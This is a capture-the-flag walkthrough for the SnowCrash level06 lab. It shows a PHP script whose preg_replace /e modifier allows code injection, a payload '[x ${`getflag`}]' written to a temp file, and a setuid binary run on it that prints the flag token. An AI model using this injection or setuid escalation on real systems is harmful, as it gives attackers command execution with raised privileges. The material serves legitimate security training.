
```sh
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```
```sh
level06@SnowCrash:~$ cat level06.php 
```

```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

> ###TEST
> 
> level06@SnowCrash:~$ echo "hello world" > /tmp/tmp.tpBYsyE1Gs/test
> 
> level06@SnowCrash:~$ ./level06 /tmp/tmp.tpBYsyE1Gs/test
> 
> hello world

```sh
level06@SnowCrash:~$ mktemp -d 
/tmp/tmp.tpBYsyE1Gs
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/tmp.tpBYsyE1Gs/getflag
level06@SnowCrash:~$ chmod 777 /tmp/tmp.tpBYsyE1Gs -R
level06@SnowCrash:~$ ./level06 /tmp/tmp.tpBYsyE1Gs/getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

```